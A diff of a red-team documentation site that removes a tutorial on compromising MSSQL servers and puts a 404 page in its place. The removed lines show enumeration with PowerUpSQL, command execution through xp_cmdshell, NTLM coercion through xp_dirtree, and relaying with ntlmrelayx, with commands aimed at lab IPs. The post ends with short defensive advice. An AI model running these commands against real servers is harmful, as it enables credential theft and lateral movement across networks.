@@ -10,33 +10,30 @@
     <meta name="generator" content="Retype 3.11.0">
 
     <!-- Primary Meta Tags -->
-    <title>Compromising MSSQL Databases by Relaying</title>
-    <meta name="title" content="Compromising MSSQL Databases by Relaying">
-    <meta name="description" content="Database security must be guaranteed in the connected digital world of today.">
+    <title>Not Found</title>
+    <meta name="title" content="Not Found">
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://lsecqt.github.io/Red-Teaming-Army/active-directory/compromising-mssql-databases-by-relaying/">
+    <link rel="canonical" href="https://lsecqt.github.io/Red-Teaming-Army/404.html">
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://lsecqt.github.io/Red-Teaming-Army/active-directory/compromising-mssql-databases-by-relaying/">
-    <meta property="og:title" content="Compromising MSSQL Databases by Relaying">
-    <meta property="og:description" content="Database security must be guaranteed in the connected digital world of today.">
+    <meta property="og:url" content="https://lsecqt.github.io/Red-Teaming-Army/404.html">
+    <meta property="og:title" content="Not Found">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://lsecqt.github.io/Red-Teaming-Army/active-directory/compromising-mssql-databases-by-relaying/">
-    <meta property="twitter:title" content="Compromising MSSQL Databases by Relaying">
-    <meta property="twitter:description" content="Database security must be guaranteed in the connected digital world of today.">
+    <meta property="twitter:url" content="https://lsecqt.github.io/Red-Teaming-Army/404.html">
+    <meta property="twitter:title" content="Not Found">
 
     <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
-    <link href="../../favicon.ico" rel="icon">
-    <link href="../../resources/css/retype.css?v=3.11.0.806603027980" rel="stylesheet">
+    <link href="/Red-Teaming-Army/favicon.ico" rel="icon">
+    <link href="/Red-Teaming-Army/resources/css/retype.css?v=3.11.0.806603027980" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../resources/js/config.js?v=3.11.0.806603027980" data-turbo-eval="false" defer></script>
-    <script data-cfasync="false" src="../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.11.0.806603027980" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="/Red-Teaming-Army/resources/js/config.js?v=3.11.0.806603027980" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="/Red-Teaming-Army/resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="/Red-Teaming-Army/resources/js/lunr.js?v=3.11.0.806603027980" data-turbo-eval="false" defer></script>
 </head>
 <body>
     <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
@@ -51,7 +48,7 @@
                 <!-- Logo -->
                 <div class="flex items-center justify-between h-full py-2 md:w-75">
                     <div class="flex items-center px-2 md:px-6">
-                        <a id="retype-branding-logo" href="../../" class="flex items-center leading-snug text-xl">
+                        <a id="retype-branding-logo" href="/Red-Teaming-Army/" class="flex items-center leading-snug text-xl">
                             <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">Red Teaming Army</span>
                         </a><span id="retype-branding-label" class="inline-flex mt-1 px-2 py-1 ml-4 text-xs font-medium leading-none items-center rounded-md bg-branding-label-bg text-branding-label-text ring-1 ring-branding-label-border ring-inset md:inline-block">Docs</span>
                     </div>
@@ -312,383 +309,13 @@
     
             <div class="grow min-w-0 bg-body-bg">
                 <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
-                <div class="flex">
-                    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
-                        <main class="relative pb-12 lg:pt-2">
-                            <div class="retype-markdown" id="retype-content">
-                                <!-- Rendered if sidebar right is enabled -->
-                                <div id="retype-sidebar-right-toggle"></div>
-                                <!-- Page content  -->
-<doc-anchor-target id="compromising-mssql-databases-by-relaying" class="break-words">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#compromising-mssql-databases-by-relaying">#</doc-anchor-trigger>
-        <span>Compromising MSSQL Databases by Relaying</span>
-    </h1>
-</doc-anchor-target>
-<doc-anchor-target id="introduction">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#introduction">#</doc-anchor-trigger>
-        <span>Introduction</span>
-    </h2>
-</doc-anchor-target>
-<p>Database security must be guaranteed in the connected digital world of today. Many firms choose Microsoft SQL Server (MSSQL) because of its strong feature set and integration capabilities. But enhanced functionality also means a larger surface area for attacks, which makes it a desirable target for (ethical) hackers. Even though there are multiple attacks targeting MSSQL databases, relaying is one of the most effective ones. They are indeed a particularly sneaky way to compromise MSSQL servers.</p>
-<p>We&#x27;ll explore the nuances of relaying attacks on MSSQL servers in this blog post. We&#x27;ll investigate the workings of these attacks, and show how they might affect the systems they are aimed against. We&#x27;ll also touch on the defensive side of the things with some remediation ideas.</p>
-<p>I have already made a video about this topic, so if you prefer watching instead of reading, feel welcomed and if you enjoy my work, feel free to subscribe:</p>
-<p>
-<figure>
-    <div class="relative w-full mb-6 overflow-hidden pt-9/16">
-        <iframe class="w-full h-full border-0 absolute inset-0" src="https://www.youtube.com/embed/o5DR_rW8_VQ" allowfullscreen></iframe>
-    </div>
-</figure>
-</p>
-<p>Additionally, if you have further appreciation to my work, don&#x27;t hesitate to become my <a href="https://www.patreon.com/Lsecqt">Patreon</a>. By doing so, you support my work while accessing custom maldev tools that I am sure you can find handy.</p>
-<doc-anchor-target id="what-is-mssql">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#what-is-mssql">#</doc-anchor-trigger>
-        <span>What is MSSQL?</span>
-    </h2>
-</doc-anchor-target>
-<p>MSSQL, or Microsoft SQL Server, is a relational database management system (RDBMS) developed by Microsoft. It is designed to store and manage large amounts of data efficiently. MSSQL uses Structured Query Language (SQL), which is the standard language for managing and manipulating databases.</p>
-<p>Think of MSSQL as a sophisticated filing system that not only keeps your data safe but also allows you to quickly retrieve and manipulate this data through queries. This database management system supports a variety of data types, including integers, text, and even more complex data structures like XML and JSON.</p>
-<p>One of the primary reasons for the adoption of MSSQL by companies is its robust performance and reliability. MSSQL is designed to handle large volumes of data efficiently, making it an ideal choice for enterprises that require high-performance databases to manage their critical applications and services.</p>
-<p>The integration of MSSQL with Active Directory (AD) provides a seamless and secure authentication mechanism, which is crucial for maintaining the integrity and security of data. By leveraging AD, companies can manage user access and permissions centrally, ensuring that only authorized personnel have access to sensitive information. This integration simplifies user management and enhances security by using existing AD credentials, reducing the need for multiple login credentials and streamlining the authentication process.</p>
-<p><figure class="content-center">
-    <img src="mssql_chart.jpg" alt="MSSQL Chart" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">MSSQL Chart</figcaption>
-</figure>
-</p>
-<doc-anchor-target id="why-mssql-databases-are-nice-targets">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#why-mssql-databases-are-nice-targets">#</doc-anchor-trigger>
-        <span>Why MSSQL Databases are nice targets?</span>
-    </h2>
-</doc-anchor-target>
-<p>From an attacker&#x27;s perspective, MSSQL databases are extremely good targets, mainly because of:</p>
-<ol>
-<li>They store sensitive data</li>
-<li>Their stored procedures</li>
-</ol>
-<p>The first option is obvious, it is a database, if we obtain some kind of access to it, we can try to read out the tables into finding credentials or other sensitive data which can help us escalate over the domain.</p>
-<p>The second option is more interesting, even though MSSQL databases are relation-based engines like MySQL and Oracle , they differ a lot.  One of the main difference is their stored procedures.</p>
-<doc-anchor-target id="what-is-a-stored-procedure">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#what-is-a-stored-procedure">#</doc-anchor-trigger>
-        <span>What is a stored procedure</span>
-    </h3>
-</doc-anchor-target>
-<p>Stored procedures in MSSQL databases are precompiled collections of one or more SQL statements that are saved under a name and processed as a unit. They play a critical role in database management and are utilized to perform a variety of tasks, from data manipulation and validation to administrative tasks.</p>
-<p>A stored procedure is written in Transact-SQL (T-SQL), which is Microsoft&#x27;s and Sybase&#x27;s proprietary extension of SQL. When a stored procedure is created, it is compiled and stored in the database catalog.</p>
-<p>Stored procedure can be manually created for ease of work, but there are predefined ones which are super interesting for us.</p>
-<p>In Microsoft SQL Server, stored procedures that start with <code v-pre>xp_</code> are known as extended stored procedures. These procedures are special because they provide an interface between SQL Server and external components or operating system services. Here are some similar stored procedures that start with <code v-pre>xp_</code>, along with brief explanations of their purposes:</p>
-<doc-anchor-target id="1-xp_fixeddrives">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#1-xp_fixeddrives">#</doc-anchor-trigger>
-        <span>1. <code v-pre>xp_fixeddrives</code></span>
-    </h3>
-</doc-anchor-target>
-<ul>
-<li><strong>Purpose:</strong> Returns information about the disk drives on the server.</li>
-<li><strong>Example:</strong> <code v-pre>EXEC xp_fixeddrives;</code></li>
-</ul>
-<doc-anchor-target id="2-xp_regread-and-xp_regwrite">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#2-xp_regread-and-xp_regwrite">#</doc-anchor-trigger>
-        <span>2. <code v-pre>xp_regread</code> and <code v-pre>xp_regwrite</code></span>
-    </h3>
-</doc-anchor-target>
-<ul>
-<li><strong>Purpose:</strong> Read from and write to the Windows registry from within SQL Server.</li>
-<li><strong>Examples:</strong>
-<ul>
-<li><code v-pre>EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\MyApp', 'Version';</code></li>
-<li><code v-pre>EXEC xp_regwrite 'HKEY_LOCAL_MACHINE', 'SOFTWARE\MyApp', 'Version', '1.0';</code></li>
-</ul>
-</li>
-</ul>
-<doc-anchor-target id="3-xp_fileexist-and-xp_filesize">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#3-xp_fileexist-and-xp_filesize">#</doc-anchor-trigger>
-        <span>3. <code v-pre>xp_fileexist</code> and <code v-pre>xp_filesize</code></span>
-    </h3>
-</doc-anchor-target>
-<ul>
-<li><strong>Purpose:</strong> Checks if a file exists and returns its size, respectively.</li>
-<li><strong>Examples:</strong>
-<ul>
-<li><code v-pre>EXEC xp_fileexist 'C:\MyFile.txt';</code></li>
-<li><code v-pre>EXEC xp_filesize 'C:\MyFile.txt';</code></li>
-</ul>
-</li>
-</ul>
-<doc-anchor-target id="4-xp_dirtree">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#4-xp_dirtree">#</doc-anchor-trigger>
-        <span>4. <code v-pre>xp_dirtree</code></span>
-    </h3>
-</doc-anchor-target>
-<ul>
-<li><strong>Purpose:</strong> Generates a hierarchical listing of files and directories within a specified directory on the file system</li>
-<li><strong>Example:</strong> <code v-pre>EXEC xp_dirtree 'C:\MyDirectory\', 1;</code></li>
-</ul>
-<doc-anchor-target id="5-xp_cmdshell">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#5-xp_cmdshell">#</doc-anchor-trigger>
-        <span>5. <code v-pre>xp_cmdshell</code></span>
-    </h3>
-</doc-anchor-target>
-<ul>
-<li><strong>Purpose:</strong> Executes operating system commands from within SQL Server.</li>
-<li><strong>Example:</strong> <code v-pre>EXEC xp_cmdshell 'dir C:\';</code></li>
-</ul>
-<p>As you might already start to get it, some of the predefined stored procedures can be abused into offense.</p>
-<doc-anchor-target id="enumerating-mssql-databases">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#enumerating-mssql-databases">#</doc-anchor-trigger>
-        <span>Enumerating MSSQL Databases</span>
-    </h2>
-</doc-anchor-target>
-<p>Before diving into the attacks, let&#x27;s first demonstrate how to obtain a valid list of targets. For this demo we will use the well-known <a href="https://github.com/NetSPI/PowerUpSQL">PowerUpSQL</a>. While this toolkit can be used not only for enumeration, we will not completely depend on it for this blogpost.</p>
-<p>It is a powershell script, after loading it either from import-module or reflectively via iex, we can now utilize its functions. One such function is <code v-pre>Get-SQLInstanceDomain</code> and <code v-pre>Get-SQLInstanceLocal</code>. As their names are speaking, these functions are querying either the Active Directory or the local system for finding database engines.</p>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-primary"></div>
-    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-callout-primary" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
-                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
-                    <path fill="none" d="M0 0h24v24H0z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-<p>PowerUpSQL is designed to enumerate and target only MSSQL servers.</p>
-        </div>
-    </div>
-</div>
-<p><figure class="content-center">
-    <img src="enum.png" alt="Get-SQLInstanceDomain output" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">Get-SQLInstanceDomain output</figcaption>
-</figure>
-If you want to select only the <code v-pre>ComputerName</code> field, you can use the powershell utility <code v-pre>select</code>:
-<code v-pre>Get-SQLInstanceDomain | select ComputerName</code></p>
-<p>Also, it is always advised to run the <code v-pre>Invoke-SQLAudit</code> against the enumerated instances for each user you compromise. You never know when you will hit the jackpot.</p>
-<p>For more <code v-pre>PowerUpSQL</code> functions, you can refer to this <a href="https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet">cheatsheet</a>.</p>
-<doc-anchor-target id="attacking-mssql-databases">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#attacking-mssql-databases">#</doc-anchor-trigger>
-        <span>Attacking MSSQL Databases</span>
-    </h2>
-</doc-anchor-target>
-<p>For these demos, we will operate from a standpoint of compromised user. We will not cover the user attack itself, but let&#x27;s imagine for a second it was due to password spray attack. The main idea of this blog is to show some of the basic attacks over MSSQL servers, without a valid credentials, what we can do is brute-forcing and credentials snuffing.</p>
-<doc-anchor-target id="attack-1---xp_cmdshell">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#attack-1---xp_cmdshell">#</doc-anchor-trigger>
-        <span>Attack 1 - XP_CMDSHELL</span>
-    </h3>
-</doc-anchor-target>
-<p>While this attack is simple and well known, I still felt the need to include it here. In order for this attack to work, we would need to have this procedure already enabled on the targeted system, or else, we would need to have sysadmin privileges over it so we can enable it. Here it is important to mention that users that have the sysadmin privileges might be on both the domain and the local level, for instance, the <code v-pre>sa</code> account is the default, main and most privileged account. On top of that, since the MSSQLs can be easily integrated with AD, it is also possible to find domain users who might have the same level of privileges, so think more open here.</p>
-<p>As mentioned, for this scenario we compromised a user which has a sysadmin level privileges over the database. When that&#x27;s the case, it is simply enough to:</p>
-<ol>
-<li>Connect to the database</li>
-</ol>
-<p>The DB Connection can be done from many different softwares, for example the <a href="https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16">SSMS</a> is utility from Microsoft, that is capable of full database management and operation. Alternatively, if operating from linux, impacket got us covered. The <code v-pre>impacket-mssqlclient</code> is nice script that is capable of performing <a href="https://www.beyondtrust.com/resources/glossary/pass-the-hash-pth-attack">pass the hash</a> while having all functionalities that we need. So in order to connect:</p>
-<p><code v-pre>impacket-mssqlclient 'DOMAIN/user'@&lt;IP OR FQDN&gt;</code></p>
-<p><figure class="content-center">
-    <img src="connect.png" alt="Connecting to MSSQL instance on 172.16.16.54" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">Connecting to MSSQL instance on 172.16.16.54</figcaption>
-</figure>
-</p>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-primary"></div>
-    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-callout-primary" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
-                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
-                    <path fill="none" d="M0 0h24v24H0z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-<p>If connecting to MSSQL instance via domain joined user, make sure to include the <code v-pre>-windows-auth</code> flag. If the flag is missing, the impacket script will tolerate the credentials on local level.</p>
-        </div>
-    </div>
-</div>
-<ol start="2">
-<li>Execute commands</li>
-</ol>
-<p><code v-pre>enable_xp_cmdshell</code></p>
-<p><code v-pre>xp_cmdshell whoami</code></p>
-<p><figure class="content-center">
-    <img src="shell.png" alt="Executing system level commands via xp_cmdshell stored procedure" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">Executing system level commands via xp_cmdshell stored procedure</figcaption>
-</figure>
-</p>
-<p>In this case, the database is running as <code v-pre>nt authority\local service</code>. Always check the user behind the MSSQL process, as you later will find how handy this can be. However, in this case, we are effectively <code v-pre>NT AUTHORITY\SYSTEM</code> since the service accounts has dangerous local privileges which can be abused with for example potato attacks. If you want to learn more about this hit me up in <a href="https://discord.gg/bgSpdheEgu">Discord</a>, so I can blog about this topic.</p>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-primary"></div>
-    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-callout-primary" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
-                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
-                    <path fill="none" d="M0 0h24v24H0z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-<p>Sometimes <code v-pre>xp_cmdshell</code> might be explicitly hardened (disabled), in such cases, you may want to try executing commands via the <code v-pre>sp_start_job</code> option from <code v-pre>impacket-mssqlclient</code>.</p>
-        </div>
-    </div>
-</div>
-<doc-anchor-target id="attack-2---relaying">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#attack-2---relaying">#</doc-anchor-trigger>
-        <span>Attack 2 - Relaying</span>
-    </h3>
-</doc-anchor-target>
-<p>Here is where it is getting more interesting. Imagine for this demo that we have compromised a user who is not sysadmin over any database, and the <code v-pre>xp_cmdshell</code> stored procedure is disabled, as well as the <code v-pre>sp_start_job</code>. Obviously one thing that we can do is to scrape the database for sensitive content, but is there any other attack vector? Yes!</p>
-<p>As previously explained, the <code v-pre>xp_dirtree</code> stored procedure is used to read local or remote files over SMB. This procedure is handy when it comes to easy database migration, but can cause some issues. Since the <code v-pre>xp_dirtree</code> is used for remote SMB operations, by setting up responder with <code v-pre>responder -I &lt;interface&gt;</code> we can grap the NTLMv2 hash of the machine account. To trigger authentication, it is enough to just do <code v-pre>xp_dirtree \\ip\share\something</code> from <code v-pre>impacket-mssqlclient</code> shell. Usually, the database server is running as <code v-pre>NT AUTHORITY \ SERVICE</code> user. This will cause the NTLMv2 hash of the machine account to be captured.</p>
-<p>However, sometimes the database service can be misconfigured to operate from the context of privileged domain account. This setting is located at <code v-pre>SQL SERVER CONFIGURATION MANAGER -&gt; DB Instance -&gt; Log On</code></p>
-<p><figure class="content-center">
-    <img src="config_domain_user.png" alt="Database running as LSEC\sql1" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">Database running as LSEC\sql1</figcaption>
-</figure>
-</p>
-<p>Now you may ask, well how to enumerate that if we dont have local access to the sever?</p>
-<p>Coerce! If the database is misconfigured, after successful authentication capture we would get the NTLMv2 of the domain user rather than the machine account.</p>
-<p><figure class="content-center">
-    <img src="ntlmv2.png" alt="Capturing NTLMv2 hash of sql1 user" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">Capturing NTLMv2 hash of sql1 user</figcaption>
-</figure>
-</p>
-<p>When that is the case, even though we don&#x27;t know the password of this user (even though we might try to crack it), we can try to relay the incoming authentication against other services / servers. Since now the captured account name nudges that he might have admin rights over some databases, I guess it makes most sense to relay it over all DB instances.</p>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-primary"></div>
-    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-callout-primary" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
-                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
-                    <path fill="none" d="M0 0h24v24H0z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-<p>If you are relaying against many hosts at once via the <code v-pre>-tf</code> flag in <code v-pre>ntlmrelayx</code>, it is super important to note the protocol for each host, for instance:</p>
-<p>mssql://host1</p>
-<p>mssql://host2</p>
-<p>If that is not the case, <code v-pre>ntlmrelayx</code> will always relay to SMB.</p>
-        </div>
-    </div>
-</div>
-<p>Now let&#x27;s setup the <code v-pre>ntlmrelayx</code>:</p>
-<p><code v-pre>impacket-ntlmrelayx -t mssql://172.16.16.52 -smb2support -ts -debug -i</code></p>
-<p>Here, the <code v-pre>-i</code> flag is super important. This flag will start fully functional <code v-pre>mssqlclient</code> shell against the target, if the authentication succeded. If this flag is missing, <code v-pre>ntlmrelayx</code> will try to execute SQL queries instead.</p>
-<p>To exploit, it is enough to trigger <code v-pre>xp_dirtree</code> again</p>
-<p><code v-pre>xp_dirtree \\172.16.16.130\share\asd</code></p>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-primary"></div>
-    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-callout-primary" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
-                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
-                    <path fill="none" d="M0 0h24v24H0z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-<p>If you are relaying into multiple targets from file, you may need to trigger the authentication several times if the process hangs up.</p>
-        </div>
-    </div>
-</div>
-<p><figure class="content-center">
-    <img src="relay.png" alt="Relaying the credentials of LSEC\sql1 user against another database" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">Relaying the credentials of LSEC\sql1 user against another database</figcaption>
-</figure>
-</p>
-<p>After the relaying is successful, <code v-pre>ntlmrelayx</code> tells us that there is interactive MSSQL shell on <code v-pre>127.0.0.1:11000</code>. Let&#x27;s connect with nc:</p>
-<p><code v-pre>nc 127.0.0.1 11000</code></p>
-<p><figure class="content-center">
-    <img src="mssqlshell.png" alt="Connecting to the interactive MSSQL shell with nc" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">Connecting to the interactive MSSQL shell with nc</figcaption>
-</figure>
-</p>
-<p>With this fully functional shell, we can no retry all the attack paths but now from the context of our privileged user.</p>
-<p><figure class="content-center">
-    <img src="whoami.png" alt="Executing xp_cmdshell" class="rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">Executing xp_cmdshell</figcaption>
-</figure>
-</p>
-<doc-anchor-target id="conclusion">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#conclusion">#</doc-anchor-trigger>
-        <span>Conclusion</span>
-    </h2>
-</doc-anchor-target>
-<p>MSSQL servers are handy, but they must be taken with care. A slight misconfiguration might allow lateral movement and persistence on multiple servers, or in the worst-case scenario, even domain takeover.</p>
-<p>From the defensive side of things, it is advised to ensure that the database servers are operating under the context of local service user. No <code v-pre>xp_cmdshell</code> is enabled, no user beside the <code v-pre>sa</code> and the DA can reconfigure the stored procedure, and also, remember to shut down <code v-pre>xp_dirtree</code> unless it is explicitly needed.</p>
-<p>Thank you for the reading, if this blog-post was useful, you can support my work by becomming my <a href="https://www.patreon.com/Lsecqt">Patreon</a>.</p>
-
-                                
-                                <!-- Required only on API pages -->
-                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
-                            </div>
-                            <footer id="retype-content-footer" class="clear-both">
-                            
-                                <nav id="retype-nextprev" class="print:hidden flex mt-14">
-                                    <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../">
-                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
-                                            <span>
-                                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
-                                                <span class="block mt-1">Red Teaming Army</span>
-                                            </span>
-                                        </a>
-                                    </div>
-                            
-                                    <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../active-directory/unleashing-the-power-of-unconstrained-delegation/">
-                                            <span>
-                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
-                                                <span class="block mt-1">Unleashing the Power of Unconstrained Delegation</span>
-                                            </span>
-                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
-                                        </a>
-                                    </div>
-                                </nav>
-                            </footer>
-                        </main>
-                
-                        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
-                            <footer class="flex flex-wrap items-center justify-between print:justify-center">
-                                <div id="retype-footer-links" class="print:hidden">
-                                    <ul class="flex flex-wrap items-center text-sm">
-                                    </ul>
-                                </div>
-                                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link-weight text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
-                            </footer>
-                        </div>
+                <div class="max-w-lg mx-auto mt-20 text-center px-6 sm:px-16 md:px-8">
+                    <div class="px-8 md:p-0 text-gray-300 dark:text-dark-650">
